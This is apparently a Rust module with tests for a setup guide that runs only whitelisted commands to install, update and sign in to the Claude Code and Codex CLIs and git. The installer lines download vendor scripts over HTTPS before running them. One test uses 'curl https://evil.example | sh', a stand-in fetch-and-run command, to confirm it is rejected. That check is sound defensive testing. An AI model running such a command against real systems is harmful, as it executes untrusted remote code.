//! The only commands the guide will ever run for the user, word for word.
//!
//! A client picks from this list by `(tool, kind, method)`; it never sends a
//! command string. The string here is what `GET /api/setup/commands` shows the
//! user before they press "Run here" and what the terminal then runs, so what
//! the user read is what runs — and the same string is what "Copy command"
//! copies, for anyone who would rather paste it into their own terminal.
//!
//! Availability: the official installers are recommended (no Node, no
//! administrator password, installed into the user's own home — which is also
//! why they survive a Mac shared with a Homebrew owned by somebody else);
//! Homebrew only shows up where `brew` is installed, npm only where Node is;
//! Claude's own installer needs macOS 13.
//!
//! # The official installers
//!
//! The vendors document `curl -fsSL <url> | bash`. Run like that, the line
//! exits with *bash's* status: with no network, curl fails, bash reads an
//! empty script and exits 0, and the install would read as a success. So the
//! script is downloaded to a file first and run only once the download
//! worked — the exit status is then curl's or the installer's, and a script
//! cut off halfway is never run either. The file is a fresh `mktemp`, removed
//! whichever way the run ends — an exit trap, and `exit` on Ctrl-C, a closed
//! terminal or a kill, so the trap runs then too. curl is held to HTTPS
//! (`--proto =https --tlsv1.2`), so no redirect can hand it a script over
//! plain HTTP.
//!
//! That takes POSIX syntax (`t=…`, `$(…)`, `&&`, `trap`), and the line is run
//! by — and pasted into — the user's own shell, which may be fish, nushell or
//! csh, none of which takes it. So the whole line is `/bin/sh -c '<POSIX
//! line>'`: one program and two arguments, which every shell runs as it is.
//! The POSIX line holds no single quote and no `\\` or `\'`, the only escapes
//! fish reads inside single quotes, so the quoting cannot break anywhere; and
//! all of it runs inside that `sh`, so pasting it into a terminal closes
//! nothing.
//!
//! Codex is updated the same way: by its installer, which installs the newest
//! release over the old one. Not `codex update` — a codex older than that
//! subcommand reads `update` as a prompt and starts an agent in the home
//! folder. The installer only replaces a copy it made, so this update is
//! offered only for a codex the official installer put there.

use gotcha::Schematic;
use serde::{Deserialize, Serialize};

use super::detect::Detection;
use super::{GitState, InstallMethod, TaskKind, ToolId};
use crate::openapi_ext::Nullable;

/// What a command is for: one of the two CLIs, or git.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Schematic)]
#[serde(rename_all = "lowercase")]
pub enum CommandTool {
    /// Claude Code.
    Claude,
    /// Codex.
    Codex,
    /// git, through Apple's command line tools.
    Git,
}

impl From<ToolId> for CommandTool {
    fn from(tool: ToolId) -> Self {
        match tool {
            ToolId::Claude => CommandTool::Claude,
            ToolId::Codex => CommandTool::Codex,
        }
    }
}

/// One whitelisted command, as the guide shows it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Schematic)]
pub struct SetupCommand {
    /// What it is for.
    pub tool: CommandTool,
    /// What it does.
    pub kind: TaskKind,
    /// `native`, `brew` or `npm` to install or update (git: `apple`); to sign
    /// in, claude's `claudeai`, `console` or `sso`, codex's `chatgpt`,
    /// `device` or `apikey`.
    pub method: String,
    /// Exactly what runs, shown verbatim.
    pub command: String,
    /// Whether it can run on this device now.
    pub available: bool,
    /// Why not, when it cannot: `macos_too_old`, `no_brew`, `no_node`,
    /// `not_native` (codex's update, for a copy its installer did not make),
    /// `not_macos`, or `already_installed` (git).
    pub reason: Nullable<String>,
    /// The one to offer first.
    pub recommended: bool,
    /// The vendor's own instructions.
    pub docs: String,
}

/// `GET /api/setup/commands`.
#[derive(Debug, Clone, Serialize, Deserialize, Schematic)]
pub struct SetupCommandList {
    /// Every command the guide can run, available or not.
    pub commands: Vec<SetupCommand>,
}

/// One row of the whitelist.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Entry {
    /// What it is for.
    pub tool: CommandTool,
    /// What it does.
    pub kind: TaskKind,
    /// Its method name.
    pub method: &'static str,
    /// The command, verbatim.
    pub command: &'static str,
}

const fn entry(tool: CommandTool, kind: TaskKind, method: &'static str, command: &'static str) -> Entry {
    Entry { tool, kind, method, command }
}

/// Claude Code's official installer, downloaded first, then run, under
/// `/bin/sh` whatever the user's shell is (see the module docs).
const CLAUDE_INSTALLER: &str = r#"/bin/sh -c 't="$(mktemp)" && trap "rm -f \"\$t\"" 0 && trap "exit 1" 1 2 15 && curl --proto =https --tlsv1.2 -fsSLo "$t" https://claude.ai/install.sh && bash "$t"'"#;
/// Codex's official installer, the same way.
const CODEX_INSTALLER: &str = r#"/bin/sh -c 't="$(mktemp)" && trap "rm -f \"\$t\"" 0 && trap "exit 1" 1 2 15 && curl --proto =https --tlsv1.2 -fsSLo "$t" https://chatgpt.com/codex/install.sh && sh "$t"'"#;

/// The whitelist. Nothing else is ever run for the user.
pub const WHITELIST: [Entry; 19] = {
    use CommandTool::{Claude, Codex, Git};
    use TaskKind::{Install, Login, Update};
    [
        entry(Claude, Install, "native", CLAUDE_INSTALLER),
        entry(Claude, Install, "brew", "brew install --cask claude-code"),
        entry(Claude, Install, "npm", "npm install -g @anthropic-ai/claude-code"),
        entry(Claude, Update, "native", "claude update"),
        entry(Claude, Update, "brew", "brew upgrade claude-code"),
        entry(Claude, Update, "npm", "npm install -g @anthropic-ai/claude-code@latest"),
        entry(Codex, Install, "native", CODEX_INSTALLER),
        entry(Codex, Install, "brew", "brew install --cask codex"),
        entry(Codex, Install, "npm", "npm install -g @openai/codex"),
        entry(Codex, Update, "native", CODEX_INSTALLER),
        entry(Codex, Update, "brew", "brew upgrade --cask codex"),
        entry(Codex, Update, "npm", "npm install -g @openai/codex@latest"),
        entry(Git, Install, "apple", "xcode-select --install"),
        entry(Claude, Login, "claudeai", "claude auth login"),
        entry(Claude, Login, "console", "claude auth login --console"),
        entry(Claude, Login, "sso", "claude auth login --sso"),
        entry(Codex, Login, "chatgpt", "codex login"),
        entry(Codex, Login, "device", "codex login --device-auth"),
        entry(Codex, Login, "apikey", "codex login --with-api-key"),
    ]
};

/// The whitelisted command for `(tool, kind, method)`, if there is one.
pub fn find(tool: CommandTool, kind: TaskKind, method: &str) -> Option<&'static Entry> {
    WHITELIST
        .iter()
        .find(|entry| entry.tool == tool && entry.kind == kind && entry.method == method)
}

/// The arguments a sign-in runs the CLI with: the whitelisted string minus
/// the CLI's own name, which is replaced by the path the guide found.
pub fn login_args(entry: &Entry) -> Vec<String> {
    entry.command.split_whitespace().skip(1).map(str::to_string).collect()
}

/// The vendor's instructions for one command.
fn docs(tool: CommandTool, kind: TaskKind) -> &'static str {
    match (tool, kind) {
        (CommandTool::Claude, TaskKind::Login) => "https://code.claude.com/docs/en/authentication",
        (CommandTool::Claude, _) => "https://code.claude.com/docs/en/setup",
        (CommandTool::Codex, TaskKind::Login) => "https://learn.chatgpt.com/docs/auth",
        (CommandTool::Codex, _) => "https://github.com/openai/codex",
        (CommandTool::Git, _) => "https://developer.apple.com/xcode/resources/",
    }
}

/// The major version of a `15.3`-style macOS version.
fn macos_major(detection: &Detection) -> Option<u32> {
    detection.os.macos.0.as_deref()?.split('.').next()?.parse().ok()
}

/// Whether the official installer put `tool` where detection found it.
fn installed_natively(detection: &Detection, tool: ToolId) -> bool {
    detection
        .tools
        .iter()
        .any(|probe| probe.id == tool && probe.found.as_ref().is_some_and(|found| found.method == InstallMethod::Native))
}

/// Whether `entry` can run on this device, and the reason when it cannot.
pub fn availability(entry: &Entry, detection: &Detection) -> Result<(), &'static str> {
    let mac = detection.os.platform == "darwin";
    match (entry.tool, entry.kind, entry.method) {
        (CommandTool::Git, _, _) if !mac => Err("not_macos"),
        (CommandTool::Git, _, _) if detection.helpers.git == GitState::Ready => Err("already_installed"),
        (CommandTool::Claude, TaskKind::Install | TaskKind::Update, "native") if mac && macos_major(detection).is_some_and(|major| major < 13) => {
            Err("macos_too_old")
        }
        // Codex's update is its installer (module docs): only over a copy the
        // installer made, never as a second one beside Homebrew's or npm's.
        (CommandTool::Codex, TaskKind::Update, "native") if !installed_natively(detection, ToolId::Codex) => Err("not_native"),
        (_, _, "brew") if !detection.helpers.brew => Err("no_brew"),
        (_, _, "npm") if detection.helpers.node.0.is_none() => Err("no_node"),
        _ => Ok(()),
    }
}

/// Every command, as `GET /api/setup/commands` lists them.
pub fn list(detection: &Detection) -> SetupCommandList {
    SetupCommandList {
        commands: WHITELIST
            .iter()
            .map(|entry| {
                let available = availability(entry, detection);
                SetupCommand {
                    tool: entry.tool,
                    kind: entry.kind,
                    method: entry.method.to_string(),
                    command: entry.command.to_string(),
                    available: available.is_ok(),
                    reason: Nullable(available.err().map(str::to_string)),
                    recommended: matches!(entry.method, "native" | "claudeai" | "chatgpt" | "apple"),
                    docs: docs(entry.tool, entry.kind).to_string(),
                }
            })
            .collect(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::setup::{SetupHelpers, SetupOs};

    fn detection(macos: Option<&str>, brew: bool, node: bool, git: GitState) -> Detection {
        Detection {
            os: SetupOs {
                platform: if macos.is_some() { "darwin" } else { "linux" }.to_string(),
                macos: Nullable(macos.map(str::to_string)),
                arch: "arm64".to_string(),
            },
            helpers: SetupHelpers {
                brew,
                node: Nullable(node.then(|| "22.3.0".to_string())),
                git,
            },
            tools: Vec::new(),
        }
    }

    /// `detection` with a codex found, installed by `method`.
    fn with_codex(mut detection: Detection, method: InstallMethod, version: &str) -> Detection {
        detection.tools.push(crate::setup::detect::ToolProbe {
            id: ToolId::Codex,
            found: Some(crate::setup::ToolFound {
                path: "/Users/ada/.local/bin/codex".to_string(),
                via: crate::setup::FoundVia::Path,
                method,
            }),
            version: Some(version.to_string()),
            supported: true,
            login: crate::setup::detect::unknown_login(),
        });
        detection
    }

    fn row<'a>(list: &'a SetupCommandList, tool: CommandTool, kind: TaskKind, method: &str) -> &'a SetupCommand {
        list.commands
            .iter()
            .find(|command| command.tool == tool && command.kind == kind && command.method == method)
            .expect("listed")
    }

    #[test]
    fn the_whitelist_is_exactly_the_design_s_and_has_no_duplicates() {
        let mut keys: Vec<_> = WHITELIST.iter().map(|entry| (entry.tool as u8, entry.kind as u8, entry.method)).collect();
        keys.sort();
        keys.dedup();
        assert_eq!(keys.len(), WHITELIST.len());
        // The vendors' installers, downloaded first (over HTTPS only): the
        // line fails when the download does, instead of piping nothing into
        // a shell that exits 0; the file goes either way.
        assert_eq!(
            find(CommandTool::Claude, TaskKind::Install, "native").map(|entry| entry.command),
            Some(
                r#"/bin/sh -c 't="$(mktemp)" && trap "rm -f \"\$t\"" 0 && trap "exit 1" 1 2 15 && curl --proto =https --tlsv1.2 -fsSLo "$t" https://claude.ai/install.sh && bash "$t"'"#
            )
        );
        assert_eq!(
            find(CommandTool::Codex, TaskKind::Install, "native").map(|entry| entry.command),
            Some(
                r#"/bin/sh -c 't="$(mktemp)" && trap "rm -f \"\$t\"" 0 && trap "exit 1" 1 2 15 && curl --proto =https --tlsv1.2 -fsSLo "$t" https://chatgpt.com/codex/install.sh && sh "$t"'"#
            )
        );
        for entry in WHITELIST {
            assert!(!entry.command.contains("| bash") && !entry.command.contains("| sh"), "{}", entry.command);
        }
        // Codex is updated by its installer: an old codex reads `update` as a
        // prompt and starts an agent.
        assert_eq!(
            find(CommandTool::Codex, TaskKind::Update, "native").map(|entry| entry.command),
            find(CommandTool::Codex, TaskKind::Install, "native").map(|entry| entry.command)
        );
        assert!(WHITELIST.iter().all(|entry| entry.command != "codex update"));
        assert!(find(CommandTool::Claude, TaskKind::Install, "curl https://evil.example | sh").is_none());
        assert!(find(CommandTool::Claude, TaskKind::Login, "native").is_none());
        let codex_key = find(CommandTool::Codex, TaskKind::Login, "apikey").expect("apikey");
        assert_eq!(login_args(codex_key), ["login", "--with-api-key"], "the key itself is never an argument");
        assert_eq!(
            login_args(find(CommandTool::Claude, TaskKind::Login, "sso").unwrap()),
            ["auth", "login", "--sso"]
        );
    }

    /// Every install and update line, as the user's own shell is handed it —
    /// `$SHELL -l -c '<line>'` in the guide's terminal, or pasted: a fish-like
    /// shell that refuses a POSIX assignment (`t=…`) takes each of them, and
    /// the POSIX line inside `/bin/sh -c '…'` parses (`sh -n`: read, never run).
    #[test]
    fn every_line_runs_in_any_shell_and_parses_as_posix() {
        use std::os::unix::fs::PermissionsExt;
        use std::process::Command;
        let dir = tempfile::tempdir().expect("tempdir");
        let fish = dir.path().join("fish");
        // Takes `-l -c <line>`, refuses a line whose first word assigns, and
        // otherwise only says it would run it: nothing here runs a command.
        std::fs::write(
            &fish,
            "#!/bin/sh\nfirst=${3%% *}\ncase \"$first\" in *=*) echo \"fish: Unsupported use of '='\" >&2; exit 127 ;; esac\necho accepted\n",
        )
        .expect("write");
        std::fs::set_permissions(&fish, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        let takes = |line: &str| {
            // A script just written can be "busy" for a moment while another
            // test's fork still holds the write handle (ETXTBSY).
            for _ in 0..100 {
                match Command::new(&fish).args(["-l", "-c", line]).output() {
                    Ok(output) => return output.status.success(),
                    Err(error) if error.raw_os_error() == Some(libc::ETXTBSY) => std::thread::sleep(std::time::Duration::from_millis(10)),
                    Err(error) => panic!("the fake shell: {error}"),
                }
            }
            panic!("the fake shell stayed busy")
        };

        assert!(
            !takes(r#"t="$(mktemp)" && curl -fsSLo "$t" https://claude.ai/install.sh && bash "$t""#),
            "the fake is fish enough to refuse the bare POSIX line"
        );
        for entry in WHITELIST.iter().filter(|entry| entry.kind != TaskKind::Login) {
            assert!(takes(entry.command), "{}", entry.command);
        }
        for line in [CLAUDE_INSTALLER, CODEX_INSTALLER] {
            let posix = posix_of(line);
            assert!(!posix.contains('\''), "no quote inside to end the wrapping early: {posix}");
            assert!(
                !posix.contains("\\\\") && !posix.contains("\\'"),
                "neither of the two escapes fish reads inside single quotes: {posix}"
            );
            let parsed = Command::new("/bin/sh").args(["-n", "-c", posix]).output().expect("sh -n");
            assert!(parsed.status.success(), "{posix}: {}", String::from_utf8_lossy(&parsed.stderr));
        }
    }

    /// The POSIX line inside one of the installers' `/bin/sh -c '…'`.
    fn posix_of(line: &'static str) -> &'static str {
        line.strip_prefix("/bin/sh -c '")
            .and_then(|rest| rest.strip_suffix('\''))
            .expect("the whole line is one /bin/sh -c '…'")
    }

    /// The installer line with its download swapped for `stand_in`: the line
    /// itself, run, without reaching the network.
    fn with_download(line: &'static str, stand_in: &str) -> String {
        let download = "curl --proto =https --tlsv1.2 -fsSLo \"$t\" https://claude.ai/install.sh";
        assert!(line.contains(download), "{line}");
        line.replacen(download, stand_in, 1)
    }

    /// Run `line` the way the guide's terminal does (`<shell> <args>`), with
    /// `MARK` naming a file the stand-in writes the script's path to; the
    /// exit status, and whether that script is still there afterwards.
    fn run_line(shell: &str, args: &[&str], line: &str, mark: &std::path::Path) -> (Option<i32>, bool) {
        use std::os::unix::process::CommandExt;
        let fakes = refusing_fakes(mark.parent().expect("scratch"));
        let mut command = std::process::Command::new(shell);
        // A clean environment whose PATH starts with fakes that refuse to
        // download anything, and a shell that is not a login one (which would
        // read the profiles and put the real curl first again): should the
        // download ever not be swapped out, nothing is fetched or run.
        command
            .args(args)
            .arg(line)
            .env_clear()
            .env("PATH", format!("{}:/usr/bin:/bin", fakes.display()))
            .env("HOME", mark.parent().expect("scratch"))
            .env("MARK", mark);
        // A shell cannot trap a signal it was started with ignored (a test
        // runner can start us that way); the terminal starts it with them on.
        // SAFETY: only async-signal-safe calls, between fork and exec.
        unsafe {
            command.pre_exec(|| {
                for signal in [libc::SIGHUP, libc::SIGINT, libc::SIGTERM] {
                    libc::signal(signal, libc::SIG_DFL);
                }
                Ok(())
            });
        }
        let status = command.status().expect("ran");
        let script = std::fs::read_to_string(mark).expect("the stand-in ran");
        (status.code(), std::path::Path::new(script.trim()).exists())
    }

    /// A folder of `curl` and `wget` that refuse (exit 97, and say so), made
    /// once in `scratch`; checked to be what a shell with it first on its PATH
    /// finds.
    fn refusing_fakes(scratch: &std::path::Path) -> std::path::PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let fakes = scratch.join("fakes");
        if !fakes.is_dir() {
            std::fs::create_dir_all(&fakes).expect("fakes");
            for name in ["curl", "wget"] {
                let fake = fakes.join(name);
                std::fs::write(&fake, "#!/bin/sh\necho \"a test's fake $0: refused\" >&2\nexit 97\n").expect("fake");
                std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).expect("chmod");
            }
            let found = std::process::Command::new("/bin/sh")
                .args(["-c", "command -v curl"])
                .env_clear()
                .env("PATH", format!("{}:/usr/bin:/bin", fakes.display()))
                .output()
                .expect("sh");
            assert_eq!(
                String::from_utf8_lossy(&found.stdout).trim(),
                fakes.join("curl").to_string_lossy(),
                "the fake curl is the one a shell finds"
            );
        }
        fakes
    }

    /// The downloaded script goes whichever way the run ends: done, failed,
    /// or stopped by a signal (Ctrl-C, a closed terminal, a kill) — and the
    /// line's status is still the run's. Nothing here reaches the network:
    /// the download is swapped for a stand-in that writes a script of its own.
    #[test]
    fn the_downloaded_script_is_removed_however_the_run_ends() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mark = dir.path().join("mark");
        let posix = posix_of(CLAUDE_INSTALLER);
        let cases = [
            ("echo \"$t\" > \"$MARK\" && echo \"exit 0\" > \"$t\"", Some(0), "done"),
            ("echo \"$t\" > \"$MARK\" && echo \"exit 3\" > \"$t\"", Some(3), "the installer failed"),
            ("echo \"$t\" > \"$MARK\" && false", Some(1), "the download failed"),
            ("echo \"$t\" > \"$MARK\" && kill -INT $$", Some(1), "Ctrl-C"),
            ("echo \"$t\" > \"$MARK\" && kill -HUP $$", Some(1), "the terminal closed"),
            ("echo \"$t\" > \"$MARK\" && kill -TERM $$", Some(1), "a kill"),
        ];
        for (stand_in, code, what) in cases {
            let _ = std::fs::remove_file(&mark);
            let line = with_download(posix, stand_in);
            let (status, left) = run_line("/bin/sh", &["-c"], &line, &mark);
            assert_eq!(status, code, "{what}: the run's own status");
            assert!(!left, "{what}: the script is gone");
        }

        // And through a real csh, where the machine has one: the whole line,
        // as the guide hands it over (`-c`, not `-l -c`, which csh refuses).
        let on_path = std::env::var("PATH").unwrap_or_default();
        let csh = on_path
            .split(':')
            .filter(|dir| !dir.is_empty())
            .flat_map(|dir| ["tcsh", "csh"].map(|name| std::path::Path::new(dir).join(name)))
            .find(|shell| shell.is_file());
        match csh.as_deref().map(|csh| csh.to_string_lossy().into_owned()) {
            Some(csh) => {
                let csh = csh.as_str();
                let _ = std::fs::remove_file(&mark);
                let line = with_download(CLAUDE_INSTALLER, "echo \"$t\" > \"$MARK\" && echo \"exit 0\" > \"$t\"");
                assert_eq!(crate::setup::tasks::shell_args(csh, &line), ["-c", line.as_str()], "{csh}");
                let with_login = std::process::Command::new(csh).args(["-l", "-c", "true"]).output().expect("ran");
                assert!(!with_login.status.success(), "{csh} refuses -l beside -c, which is why it gets -c alone");
                let (status, left) = run_line(csh, &["-c"], &line, &mark);
                assert_eq!(status, Some(0), "{csh} runs the line as sh would");
                assert!(!left);
            }
            None => eprintln!("no csh or tcsh on this machine: the csh path was not run"),
        }
    }

    #[test]
    fn availability_follows_the_device() {
        let rich = list(&with_codex(
            detection(Some("15.3"), true, true, GitState::Missing),
            InstallMethod::Native,
            "0.163.0",
        ));
        assert!(rich.commands.iter().all(|command| command.available), "{rich:?}");
        assert!(row(&rich, CommandTool::Claude, TaskKind::Install, "native").recommended);
        assert!(!row(&rich, CommandTool::Claude, TaskKind::Install, "brew").recommended);
        assert!(row(&rich, CommandTool::Codex, TaskKind::Login, "chatgpt").recommended);
        assert_eq!(
            row(&rich, CommandTool::Claude, TaskKind::Install, "native").docs,
            "https://code.claude.com/docs/en/setup"
        );

        let bare = list(&detection(Some("12.7.4"), false, false, GitState::Ready));
        let reason = |tool, kind, method| row(&bare, tool, kind, method).reason.0.clone();
        assert_eq!(
            reason(CommandTool::Claude, TaskKind::Install, "native").as_deref(),
            Some("macos_too_old"),
            "H8"
        );
        assert_eq!(
            reason(CommandTool::Codex, TaskKind::Install, "native"),
            None,
            "codex's installer has no such floor"
        );
        assert_eq!(reason(CommandTool::Claude, TaskKind::Install, "brew").as_deref(), Some("no_brew"));
        assert_eq!(reason(CommandTool::Codex, TaskKind::Update, "npm").as_deref(), Some("no_node"));
        assert_eq!(reason(CommandTool::Git, TaskKind::Install, "apple").as_deref(), Some("already_installed"));
        assert_eq!(
            reason(CommandTool::Codex, TaskKind::Update, "native").as_deref(),
            Some("not_native"),
            "no codex at all: nothing for its installer to update"
        );
        for method in [InstallMethod::Brew, InstallMethod::Npm, InstallMethod::Unknown] {
            let other = list(&with_codex(detection(Some("15.3"), true, true, GitState::Ready), method, "0.40.0"));
            assert_eq!(
                row(&other, CommandTool::Codex, TaskKind::Update, "native").reason.0.as_deref(),
                Some("not_native"),
                "{method:?}: not a second copy beside the one that is there"
            );
        }

        let linux = list(&detection(None, false, true, GitState::Missing));
        assert_eq!(
            row(&linux, CommandTool::Git, TaskKind::Install, "apple").reason.0.as_deref(),
            Some("not_macos")
        );
        assert!(
            row(&linux, CommandTool::Claude, TaskKind::Install, "native").available,
            "no macOS floor off a Mac"
        );
    }
}
